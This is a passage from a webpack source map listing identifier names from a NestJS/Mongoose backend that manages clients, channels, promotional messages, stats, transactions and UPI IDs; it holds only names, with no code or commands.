ChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","bulkOps","dto","updateOne","bulkWrite","ordered","find","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","randomIndex","reaction","getActiveChannels","skip","notIds","participantsCount","$gt","$ne","restricted","forbidden","sort","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","default","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","body","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","Put","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","deletedCount","removeFromBufferMap","clearBufferMap","skipExisting","existingkeys","clients","$nin","joinChannelQueue","joinChannelIntervalId","shift","availableDate","ConflictException","clientMobiles","flatMap","promoteMobile","bufferclients","promoteclients","promoteclientIds","sixMonthsAgo","documents","pop","PromoteClientService","IsNumber","ApiPropertyOptional","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","keywords","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","updateClient","findAllMasked","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","archivedClientService","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","values","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","setup","days","archiveOld","formalities","updatedUsername","toUpperCase","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","dbcoll","updateClients","generateNewSession","attempt","IsUrl","v","IsArray","ArrayNotEmpty","each","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","method","maxBodyLength","Infinity","headers","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","post","token","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","CreateStatDto","Stat2Controller","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","Stat2Service","StatSchema","Stat2","statModel","stat","StatController","StatService","Stat","CreateTransactionDto","UpdateTransactionDto","Transaction","Document","TransactionSchema","TransactionController","transactionService","createTransactionDto","updateTransactionDto","TransactionService","transactionModel","newTransaction","transaction","findById","transactionId","$options","issue","transactions","countDocuments","updatedTransaction","findByIdAndUpdate","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","then","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","IsBoolean","UpdateUserDto","User","UserSchema","UsersController","createUserDto","queryParams","updateUserDto","userModel","clientsService","matchedCount","modifiedCount","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","use","next","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","reason","isShuttingDown","shutdown","signal","exit","init","listen","bootstrap","originalUrl","ip","some","endpoint","verbose","ms","str","arr","element","options","maxRetries","fetchWithProtocol","version","source","CancelToken","cancel","cancelToken","family","isCancel","retryCount","responseIPv4","responseIPv6","inputString","matches","botToken","botCount","json1","json2","keysToIgnore","deepCompare","obj1","obj2","keys1","keys2","obj","extractMessage","isArray","item","resultString","errors","module","require","__webpack_module_cache__","__webpack_exports__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","call"],"sourceRoot":""}